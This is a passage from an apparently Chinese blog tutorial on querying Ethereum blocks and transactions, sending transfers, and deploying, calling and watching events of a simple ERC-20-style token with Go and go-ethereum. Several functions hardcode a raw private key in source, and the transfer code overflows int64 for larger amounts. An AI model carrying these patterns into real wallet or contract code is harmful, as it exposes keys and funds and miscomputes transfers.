Difficulty: blkInfo.Difficulty().Uint64(),</span><br><span class="line">    Nonce:      blkInfo.Nonce(),</span><br><span class="line">    Miner:      blkInfo.Coinbase().Hex(),</span><br><span class="line">    TransCount: <span class="type">uint64</span>(<span class="built_in">len</span>(blkInfo.Transactions())),</span><br><span class="line">  &#125;, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(op *OpBlock)</span></span> ListBlocks(from, to <span class="type">uint64</span>) ([]BlockInfo, <span class="type">error</span>) &#123;</span><br><span class="line">  blkMaxNum, err := op.GetBlockNumber()</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">  &#125;</span><br><span class="line">  start := max(from, <span class="number">0</span>)</span><br><span class="line">  end := min(to, blkMaxNum)</span><br><span class="line"></span><br><span class="line">  blocks := <span class="built_in">make</span>([]BlockInfo, <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">for</span> i := start; i &lt;= end; i++ &#123;</span><br><span class="line">    bi, err := op.GetBlockInfo(i)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    &#125;</span><br><span class="line">    blocks = <span class="built_in">append</span>(blocks, bi)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> blocks, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="交易查询"><a href="#交易查询" class="headerlink" title="交易查询"></a>交易查询</h2><p><em>trans.go</em></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> OpTrans <span class="keyword">struct</span> &#123;</span><br><span class="line">  client *blockchain.Client</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewOpTrans</span><span class="params">(bcClient *blockchain.Client)</span></span> *OpTrans &#123;</span><br><span class="line">  <span class="keyword">return</span> &amp;OpTrans&#123;client: bcClient&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(op *OpTrans)</span></span> Transfer(to <span class="type">string</span>, value <span class="type">uint64</span>) (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">  <span class="comment">// 1. 使用私钥生成 ECDSA 密钥对</span></span><br><span class="line">  privateKey, err := crypto.HexToECDSA(<span class="string">&quot;ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80&quot;</span>)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 2. 从私钥中获取公钥</span></span><br><span class="line">  pubKey, ok := privateKey.Public().(*ecdsa.PublicKey)</span><br><span class="line">  <span class="keyword">if</span> !ok &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;failed to get public key&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 3. 从公钥中获取From地址</span></span><br><span class="line">  fromAddress := crypto.PubkeyToAddress(*pubKey)</span><br><span class="line">  toAddress := common.HexToAddress(to)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 4. 获取当前账户(From地址)的nonce值</span></span><br><span class="line">  nonce, err := op.client.Eth.PendingNonceAt(context.Background(), fromAddress)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 5. 设置转账金额</span></span><br><span class="line">  val := big.NewInt(<span class="type">int64</span>(value * <span class="number">1000000000000000000</span>)) <span class="comment">// in wei (1 eth)</span></span><br><span class="line">  <span class="comment">// 6. 设置gasLimit</span></span><br><span class="line">  <span class="comment">//gasLimit := uint64(21000) // in units</span></span><br><span class="line">  gasLimit, err := op.client.Eth.EstimateGas(context.Background(), ethereum.CallMsg&#123;</span><br><span class="line">    From:  fromAddress,</span><br><span class="line">    To:    &amp;toAddress,</span><br><span class="line">    Value: val,</span><br><span class="line">    Data:  <span class="literal">nil</span>,</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 7. 获取当前推荐的gasPrice</span></span><br><span class="line">  gasPrice, err := op.client.Eth.SuggestGasPrice(context.Background())</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 8. 获取当前网络的chainID</span></span><br><span class="line">  chainId, err := op.client.Eth.NetworkID(context.Background())</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 9. 创建交易</span></span><br><span class="line">  tx := types.NewTransaction(nonce, toAddress, val, gasLimit, gasPrice, <span class="literal">nil</span>)</span><br><span class="line">  <span class="comment">// 10. 签名交易</span></span><br><span class="line">  signTx, err := types.SignTx(tx, types.NewEIP155Signer(big.NewInt(chainId.Int64())), privateKey)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 11. 发送交易</span></span><br><span class="line">  err = op.client.Eth.SendTransaction(context.Background(), signTx)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> signTx.Hash().Hex(), err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(op *OpTrans)</span></span> GetHeaderTransactionCount() (<span class="type">uint</span>, <span class="type">error</span>) &#123;</span><br><span class="line">  headerBlockNum, err := op.client.Eth.HeaderByNumber(context.Background(), <span class="literal">nil</span>)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatal(err)</span><br><span class="line">  &#125;</span><br><span class="line">  blockInfo, err := op.client.Eth.BlockByNumber(context.Background(), big.NewInt(<span class="type">int64</span>(headerBlockNum.Number.Int64())))</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatal(err)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> op.client.Eth.TransactionCount(context.Background(), blockInfo.Hash())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(op *OpTrans)</span></span> ListTX(blkHash <span class="type">string</span>) ([]TXInfo, <span class="type">error</span>) &#123;</span><br><span class="line">  block, err := op.client.Eth.BlockByHash(context.Background(), common.HexToHash(blkHash))</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatal(err)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> txInfos []TXInfo</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> _, tx := <span class="keyword">range</span> block.Transactions() &#123;</span><br><span class="line">    txHash := tx.Hash()</span><br><span class="line">    receipt, err := op.client.Eth.TransactionReceipt(context.Background(), txHash)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    &#125;</span><br><span class="line">    chainId := tx.ChainId()</span><br><span class="line">    from, err := types.Sender(types.NewEIP155Signer(chainId), tx)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    &#125;</span><br><span class="line">    txInfo := TXInfo&#123;</span><br><span class="line">      TxHash:     txHash.Hex(),</span><br><span class="line">      TxValue:    tx.Value().Uint64(),</span><br><span class="line">      TxGas:      tx.Gas(),</span><br><span class="line">      TxGasPrice: tx.GasPrice().Uint64(),</span><br><span class="line">      TxNonce:    tx.Nonce(),</span><br><span class="line">      TxData:     tx.Data(),</span><br><span class="line">      TxTo:       tx.To().Hex(),</span><br><span class="line">      TxReceipt:  <span class="type">uint8</span>(receipt.Status),</span><br><span class="line">      TxFrom:     from.Hex(),</span><br><span class="line">    &#125;</span><br><span class="line">    txInfos = <span class="built_in">append</span>(txInfos, txInfo)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> txInfos, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="合约的部署"><a href="#合约的部署" class="headerlink" title="合约的部署"></a>合约的部署</h2><p>首先编写一个Solidity合约。</p>
<p><em>mytoken.sol</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract MyToken &#123;</span><br><span class="line">    string public constant name = &quot;Bob&#x27;s Token&quot;;</span><br><span class="line">    string public constant symbol = &quot;BBK&quot;;</span><br><span class="line">    uint8 public constant decimals = 18;</span><br><span class="line">    uint16 private constant increase = 1000;</span><br><span class="line">    uint256 public constant totalLimit = 27000000 * (10 ** decimals);</span><br><span class="line">    uint256 public totalSupply = 0;</span><br><span class="line">    address private owner;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed _from, address indexed _to, uint256 _value);</span><br><span class="line">    event Approval(address indexed _owner, address indexed _spender, uint256 _value);</span><br><span class="line"></span><br><span class="line">    modifier checkAddress(address _addr) &#123;</span><br><span class="line">        require(address(_addr) != address(0), &quot;Invalid address.&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier checkBalanceOf(address _addr, uint256 _value) &#123;</span><br><span class="line">        require(balanceOf[_addr] &gt;= _value, &quot;Insufficient balance&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier checkOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Not owner.&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address _to) public checkOwner returns (uint256) &#123;</span><br><span class="line">        uint256 mintValue = increase * (10  ** decimals);</span><br><span class="line">        require(totalLimit &gt;= (totalSupply + mintValue), &quot;Out of limit.&quot;);</span><br><span class="line">        totalSupply += mintValue;</span><br><span class="line">        balanceOf[_to] += mintValue;</span><br><span class="line">        return balanceOf[_to];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public checkAddress(_to) checkBalanceOf(msg.sender, _value) returns (bool success)&#123;</span><br><span class="line">        balanceOf[msg.sender] -= _value;</span><br><span class="line">        balanceOf[_to] += _value;</span><br><span class="line">        emit Transfer(msg.sender, _to, _value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address _from, address _to, uint256 _value) public checkAddress(_to) checkBalanceOf(_from, _value) returns (bool success) &#123;</span><br><span class="line">        require(allowance[_from][msg.sender] &gt;= _value, &quot;No enough approve value.&quot;);</span><br><span class="line">        allowance[_from][msg.sender] -= _value;</span><br><span class="line">        balanceOf[_from] -= _value;</span><br><span class="line">        balanceOf[_to] += _value;</span><br><span class="line">        emit Transfer(_from, _to, _value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address _spender, uint256 _value) public returns (bool success)&#123;</span><br><span class="line">        allowance[msg.sender][_spender] = _value;</span><br><span class="line">        emit Approval(msg.sender, _spender, _value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后使用工具<code>abigen</code>将这个合约编译并导出成<code>mytoken.go</code>的源代码文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">abigen --bin ./MyToken.bin --abi MyToken.abi --out ./mytoken.go --pkg mytoken</span></span><br></pre></td></tr></table></figure>

<p>最后在部署的时候调用引入这个包并调用其中的部署方法完成部署。</p>
<p><em>contract.go</em></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> contract <span class="keyword">struct</span> &#123;</span><br><span class="line">  client *blockchain.Client</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewContract</span><span class="params">(client *blockchain.Client)</span></span> *contract &#123;</span><br><span class="line">  <span class="keyword">return</span> &amp;contract&#123;client: client&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *contract)</span></span> DeployContract() (<span class="type">string</span>, <span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">  privateKey, err := crypto.HexToECDSA(<span class="string">&quot;ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80&quot;</span>)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, err</span><br><span class="line">  &#125;</span><br><span class="line">  chainId, err := c.client.Eth.ChainID(context.Background())</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, err</span><br><span class="line">  &#125;</span><br><span class="line">  txOpts, err := bind.NewKeyedTransactorWithChainID(privateKey, chainId)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, err</span><br><span class="line">  &#125;</span><br><span class="line">  bk := backend.NewMyTokenCB(c.client.Eth)</span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> 部署合约</span></span><br><span class="line">  contractAddress, txHash, _, err := mytoken.DeployMytoken(txOpts, *bk)</span><br><span class="line">  <span class="keyword">return</span> contractAddress.Hex(), txHash.Hash().Hex(), err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="关于abigen工具的编译安装"><a href="#关于abigen工具的编译安装" class="headerlink" title="关于abigen工具的编译安装"></a>关于abigen工具的编译安装</h3><p>克隆<code>go-ethereum</code>代码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">clone</span> git@github.com:ethereum/go-ethereum.git ethereum/go-ethereum</span></span><br></pre></td></tr></table></figure>

<p>编译<code>go-ethereum</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span></span><br><span class="line">go run build/ci.go install ./cmd/geth</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; /usr/local/go/bin/go build -ldflags <span class="string">&quot;--buildid=none -X github.com/ethereum/go-ethereum/internal/version.gitCommit=f861535f1ecc59ad279c35f77f3962efc14dcf98 -X github.com/ethereum/go-ethereum/internal/version.gitDate=20241219 -s&quot;</span> -tags urfave_cli_no_docs,ckzg -trimpath -v -o /Users/zhoub/Labs/ethereum/go-ethereum/build/bin/geth ./cmd/geth</span></span><br><span class="line">internal/goarch</span><br><span class="line">internal/profilerecord</span><br><span class="line">internal/unsafeheader</span><br><span class="line">internal/race</span><br><span class="line">internal/goexperiment</span><br><span class="line">internal/coverage/rtcov</span><br><span class="line">internal/byteorder</span><br><span class="line">...</span><br><span class="line">github.com/cockroachdb/pebble</span><br><span class="line">github.com/ethereum/go-ethereum/ethdb/pebble</span><br><span class="line">github.com/ethereum/go-ethereum/node</span><br><span class="line">github.com/ethereum/go-ethereum/ethstats</span><br><span class="line">github.com/ethereum/go-ethereum/graphql</span><br><span class="line">github.com/ethereum/go-ethereum/eth</span><br><span class="line">github.com/ethereum/go-ethereum/eth/catalyst</span><br><span class="line">github.com/ethereum/go-ethereum/cmd/utils</span><br><span class="line">github.com/ethereum/go-ethereum/cmd/geth</span><br><span class="line">Done building.</span><br><span class="line">Run &quot;./build/bin/geth&quot; to launch geth.</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make devtool</span></span><br><span class="line">env GOBIN= go install golang.org/x/tools/cmd/stringer@latest</span><br><span class="line">go: downloading golang.org/x/tools v0.28.0</span><br><span class="line">env GOBIN= go install github.com/fjl/gencodec@latest</span><br><span class="line">go: downloading github.com/fjl/gencodec v0.0.0-20230517082657-f9840df7b83e</span><br><span class="line">go: downloading github.com/garslo/gogen v0.0.0-20170306192744-1d203ffc1f61</span><br><span class="line">go: downloading golang.org/x/tools v0.0.0-20191126055441-b0650ceb63d9</span><br><span class="line">env GOBIN= go install google.golang.org/protobuf/cmd/protoc-gen-go@latest</span><br><span class="line">go: downloading google.golang.org/protobuf v1.36.1</span><br><span class="line">env GOBIN= go install ./cmd/abigen</span><br><span class="line">solc is /opt/homebrew/bin/solc</span><br><span class="line">protoc is /opt/homebrew/bin/protoc</span><br></pre></td></tr></table></figure>

<h2 id="合约的调用"><a href="#合约的调用" class="headerlink" title="合约的调用"></a>合约的调用</h2><p><em>contract.go</em></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *contract)</span></span> Call(addr <span class="type">string</span>, category <span class="type">string</span>, params <span class="keyword">interface</span>&#123;&#125;) (<span class="keyword">interface</span>&#123;&#125;, <span class="type">error</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> resp <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">  <span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line"></span><br><span class="line">  instance, err := mytoken.NewMytoken(common.HexToAddress(addr), c.client.Eth)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">switch</span> category &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&quot;BalanceOf&quot;</span>:</span><br><span class="line">    callOpts := &amp;bind.CallOpts&#123;</span><br><span class="line">      Pending: <span class="literal">false</span>,</span><br><span class="line">      Context: context.Background(),</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> account, ok := params.(<span class="type">string</span>); ok &#123;</span><br><span class="line">      bBlance, err := instance.BalanceOf(callOpts, common.HexToAddress(account))</span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">      &#125;</span><br><span class="line">      resp = bBlance.String()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      err = errors.New(<span class="string">&quot;invalid params&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&quot;Transfer&quot;</span>:</span><br><span class="line">    <span class="comment">// 使用私钥生成 ECDSA 密钥对</span></span><br><span class="line">    privateKey, err := crypto.HexToECDSA(<span class="string">&quot;ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;failed to get private key&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取当前账户的地址</span></span><br><span class="line">    pubAddr := crypto.PubkeyToAddress(privateKey.PublicKey)</span><br><span class="line">    <span class="comment">// 获取当前账户的nonce值</span></span><br><span class="line">    nonce, err := c.client.Eth.PendingNonceAt(context.Background(), pubAddr)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;failed to get nonce&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取当前推荐的gasPrice</span></span><br><span class="line">    gasPrice, err := c.client.Eth.SuggestGasPrice(context.Background())</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;failed to get gas price&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    gasLimit := <span class="type">uint64</span>(<span class="number">30000000</span>)</span><br><span class="line">    txOpts := &amp;bind.TransactOpts&#123;</span><br><span class="line">      From:  pubAddr,</span><br><span class="line">      Nonce: big.NewInt(<span class="type">int64</span>(nonce)),</span><br><span class="line">      Signer: <span class="function"><span class="keyword">func</span><span class="params">(addr common.Address, tx *types.Transaction)</span></span> (*types.Transaction, <span class="type">error</span>) &#123;</span><br><span class="line">        chainId, err := c.client.Eth.ChainID(context.Background())</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;failed to get chain id&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> types.SignTx(tx, types.NewEIP155Signer(chainId), privateKey)</span><br><span class="line"></span><br><span class="line">      &#125;,</span><br><span class="line">      Value:    <span class="literal">nil</span>,</span><br><span class="line">      GasPrice: gasPrice,</span><br><span class="line">      GasLimit: gasLimit,</span><br><span class="line">      Context:  context.Background(),</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> txParams, ok := params.(TransactParams); ok &#123;</span><br><span class="line">      resp, err = instance.TransferFrom(txOpts, common.HexToAddress(txParams.TxFrom),</span><br><span class="line">        common.HexToAddress(txParams.TxTo), big.NewInt(<span class="type">int64</span>(txParams.TxValue)))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;invalid params&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;unsupported category&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> resp, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="合约的事件"><a href="#合约的事件" class="headerlink" title="合约的事件"></a>合约的事件</h2><p>智能合约具有在执行期间“发出”事件的能力。 事件在以太坊中也称为“日志”。 事件的输出存储在日志部分下的事务处理中。 事件已经在以太坊智能合约中被广泛使用，以便在发生相对重要的动作时记录，特别是在代币合约（即ERC-20）中，以指示代币转账已经发生。</p>
<p><em>event.go</em></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *ContractEvent)</span></span> Run(contractAddr <span class="type">string</span>) &#123;</span><br><span class="line">  query := ethereum.FilterQuery&#123;</span><br><span class="line">    Addresses: []common.Address&#123;common.HexToAddress(contractAddr)&#125;,</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ch := <span class="built_in">make</span>(<span class="keyword">chan</span> types.Log)</span><br><span class="line">  sp, err := e.Client.SubscribeFilterLogs(context.Background(), query, ch)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;SubscribeFilterLogs err: %v\n&quot;</span>, err)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> &#123;</span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> err := &lt;-sp.Err():</span><br><span class="line">      fmt.Printf(<span class="string">&quot;sp err: %v\n&quot;</span>, err)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">case</span> vLog := &lt;-ch:</span><br><span class="line">      logJSON, err := json.Marshal(vLog)</span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;json.Marshal err: %v\n&quot;</span>, err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      fmt.Printf(<span class="string">&quot;vLog: %s\n&quot;</span>, logJSON)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>event.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *ContractEvent)</span></span> ListWithBlkId(contractAddr <span class="type">string</span>, fromBlock, toBlock <span class="type">uint64</span>) ([]LogInfo, <span class="type">error</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> fromBlock &gt; toBlock &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;fromBlock &gt; toBlock&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> fBlock *big.Int</span><br><span class="line">  <span class="keyword">var</span> tBlock *big.Int</span><br><span class="line">  <span class="keyword">if</span> fromBlock &gt; <span class="number">0</span> &#123;</span><br><span class="line">    fBlock = big.NewInt(<span class="type">int64</span>(fromBlock))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> toBlock &gt; <span class="number">0</span> &#123;</span><br><span class="line">    tBlock = big.NewInt(<span class="type">int64</span>(toBlock))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  query := ethereum.FilterQuery&#123;</span><br><span class="line">    Addresses: []common.Address&#123;common.HexToAddress(contractAddr)&#125;,</span><br><span class="line">    FromBlock: fBlock,</span><br><span class="line">    ToBlock:   tBlock,</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  logs, err := e.Client.FilterLogs(context.Background(), query)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  contractABI, err := abi.JSON(strings.NewReader(mytoken.MytokenABI))</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> logsInfo []LogInfo</span><br><span class="line">  <span class="keyword">var</span> logType <span class="type">string</span></span><br><span class="line">  <span class="keyword">for</span> _, vLog := <span class="keyword">range</span> logs &#123;</span><br><span class="line">    <span class="keyword">if</span> topic, ok := e.TopicMap[vLog.Topics[<span class="number">0</span>].Hex()]; !ok &#123;</span><br><span class="line">      fmt.Printf(<span class="string">&quot;topic not found: %s\n&quot;</span>, vLog.Topics[<span class="number">0</span>].Hex())</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      logType = topic</span><br><span class="line">    &#125;</span><br><span class="line">    parseData, err := contractABI.Unpack(logType, vLog.Data)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> logJSON, err := json.Marshal(vLog); err == <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;Unpack err: %v\n %s&quot;</span>, err, logJSON)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;Unpack err: %v\n %v&quot;</span>, err, vLog)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> strData <span class="type">string</span></span><br><span class="line">    <span class="keyword">switch</span> logType &#123;</span><br><span class="line">    <span class="keyword">case</span> TransferTopic:</span><br><span class="line">      strData = parseData[<span class="number">0</span>].(*big.Int).String()</span><br><span class="line">    <span class="keyword">case</span> ApproveTopic:</span><br><span class="line">      strData = parseData[<span class="number">0</span>].(*big.Int).String()</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      fmt.Printf(<span class="string">&quot;Unknow parse data: %v\n&quot;</span>, parseData)</span><br><span class="line">      strData = <span 